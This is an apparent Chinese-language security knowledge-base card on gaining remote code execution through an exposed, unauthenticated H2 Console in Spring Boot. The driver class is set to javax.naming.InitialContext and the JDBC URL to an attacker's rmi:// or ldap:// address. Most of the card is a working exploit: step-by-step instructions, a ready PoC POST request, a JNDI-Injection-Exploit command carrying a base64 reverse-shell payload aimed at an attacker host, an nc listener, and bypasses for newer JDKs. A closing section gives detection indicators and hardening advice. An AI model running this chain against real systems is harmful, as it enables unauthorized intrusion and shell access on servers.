---
id: web-java-component-h2-console-unauth-jndi-initialcontext-driver
title: H2 Console 未授权登录表单：Driver Class 填 javax.naming.InitialContext + rmi/ldap URL 触发 JNDI 注入 RCE
type: scenario
domain: web
path: web/java/component
technique: h2-console-initialcontext-driver-jndi-rce
tags:
- java
- h2
- h2-console
- spring-boot
- jdbc
- jndi
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:33:59+08:00'
  notes: 已对照原文与图06-08核对：spring.h2.console.enabled=true + web-allow-others=true、/h2-console 表单 Driver Class=javax.naming.InitialContext、JDBC URL=rmi://...、JNDI-Injection-Exploit 与反弹 shell 截图一致；未复跑。
url: /docs/web/java/component/web-java-component-h2-console-unauth-jndi-initialcontext-driver/
draft: false
kb_aliases:
- H2 Console JNDI
- h2-console 未授权
- javax.naming.InitialContext 驱动
- rmi:// JDBC URL
- JNDI-Injection-Exploit
- H2 JdbcUtils Context lookup
---

## 一句话结论

Spring Boot 应用开启 H2 Web Console 且允许外部访问（`spring.h2.console.enabled=true`、`spring.h2.console.settings.web-allow-others=true`）时，未授权攻击者可在 `/h2-console` 登录表单把 Driver Class 填成 `javax.naming.InitialContext`、JDBC URL 填成 `rmi://attacker:1389/...`，H2 会把该驱动类当 JNDI Context 实例化并 `lookup(url)`，由恶意 RMI/LDAP 服务返回引用、加载远程类并执行，形成命令执行。

## 原理

- H2 自带 Web 管理页面，登录页允许用户填写 `Driver Class`、`JDBC URL`、用户名与口令；服务端按用户提供的驱动类与 URL 建立连接。
- H2 的 `org.h2.util.JdbcUtils.getConnection(driver, url, user, password)` 在驱动类不是 `java.sql.Driver`、而是 `javax.naming.Context` 的实现时，会实例化该 Context 并对 URL 调用 `lookup(url)`，再把结果转换为 DataSource 获取连接。
- `javax.naming.InitialContext` 正是 `Context` 实现；给它一个 `rmi://` 或 `ldap://` URL，`lookup` 就会向攻击者控制的 RMI/LDAP 服务发起 JNDI 请求。
- 攻击者的 JNDI 服务返回 `Reference`，其中指定 `ReferenceFactory` 与远程 class 地址；低版本 JDK（如 < 8u191/7u201/6u211 等）允许从远程 codebase 加载并实例化类，触发其构造方法/静态初始化，从而执行命令。
- 高版本 JDK 默认禁止远程 codebase，但可改用本地工厂 gadget、`javax.el.ELProcessor` 等绕过手段（如 JNDIExploit 的 TomcatBypass 模块），具体取决于目标 classpath。
- `web-allow-others=true` 是让 H2 Console 监听非 localhost 的关键配置；默认只允许本机访问。H2 Console 自身没有登录鉴权（用户名/口令是数据库的），因此攻击者可以直接提交连接表单。

## 触发条件

- Spring Boot 应用启用 H2 Console 并允许外部访问（`spring.h2.console.enabled=true` 且 `spring.h2.console.settings.web-allow-others=true`），`/h2-console` 可达。
- 目标能出站访问攻击者的 RMI/LDAP 服务。
- JDK 版本允许 JNDI 远程类加载，或攻击者有针对高版本 JDK 的本地工厂/EL 绕过链。
- H2 Console 的登录表单允许自定义 Driver Class 与 JDBC URL（默认行为）。

## 利用步骤

1. 访问 `/h2-console`，出现 H2 登录页即确认未授权控制台暴露。
2. 在攻击机启动 JNDI 注入服务：用 JNDI-Injection-Exploit 生成 RMI/LDAP 地址，命令为反弹 shell 的 Base64，例如 `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -c {echo,<base64>}|{base64,-d}|{bash,-i}' -A <attacker-ip>`。
3. 在攻击机监听反弹 shell 端口（如 3333）。
4. 在 H2 登录页选择 Generic H2 (Embedded)，Driver Class 填 `javax.naming.InitialContext`，JDBC URL 填工具生成的 `rmi://` 或 `ldap://` 地址，User Name 任意（如 `sa`），Password 留空，点击 Connect。
5. 目标发起 JNDI lookup，加载并实例化恶意类，反弹 shell 到攻击机；用 `id` 确认权限。
6. 若 RMI 被拦截或高版本 JDK 限制，改用 LDAP + 本地工厂/ELProcessor 链，或换用其他 JNDI 利用工具。

## PoC

登录页表单字段（等价 POST）：

```http
POST /h2-console/login.do HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

language=en&setting=Generic+H2+(Embedded)&driver=javax.naming.InitialContext&url=rmi://attacker:1389/JNDIObject&user=sa&password=
```

攻击端 JNDI 服务：

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C 'bash -c {echo,<base64_of_reverse_shell>}|{base64,-d}|{bash,-i}' \
  -A attacker-ip
# 选择生成的 rmi:// 或 ldap:// 地址填入 H2 Console 的 JDBC URL
```

```bash
nc -lvnp 3333
```

## 变体与关联

- 变体：JDBC URL 换成 `ldap://attacker:1389/...`；高版本 JDK 用 JNDIExploit 的 `TomcatBypass/Command/Base64/...` 等本地工厂模块。
- 变体：若 H2 Console 只允许 localhost，可配合 SSRF/端口转发或从内网访问。
- 关联：[[web-java-component-h2-console-postgres-loggerfile-ascii-jar-spring-xml-rce]]（同一 `/h2-console` 未授权入口，但走 PostgreSQL 驱动写 JAR + Spring XML，不出网）、[[web-java-expression-spel-spring-cloud-gateway-property-write-env-h2-rce]]（先通过属性写开启 H2 Console，再走本卡 JNDI 姿势）、[[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]（JNDI 基础）。
- 边界：H2 Console 关闭、未开 `web-allow-others`、JDK 高版本且无本地工厂 gadget、目标不能出站时，该链不成立。

## 检测与防御

- 检测：`/h2-console/login.do` 请求中出现 `javax.naming.InitialContext`、`rmi://`、`ldap://`、`JNDIObject`；应用异常外连 1389/1099 等 JNDI 端口；H2 Console 被外部 IP 访问。
- 防御：生产环境关闭 H2 Console（`spring.h2.console.enabled=false`），或仅绑定 localhost 并加网络访问控制；不要开启 `web-allow-others=true`。
- 防御：升级 JDK 到禁用远程 codebase 的版本，并对 JNDI 配置 `com.sun.jndi.ldap.object.trustURLCodebase=false`；限制应用出站访问。
- 加固：从生产依赖中移除 H2（或仅测试环境使用），对 `/h2-console` 做认证与来源白名单。
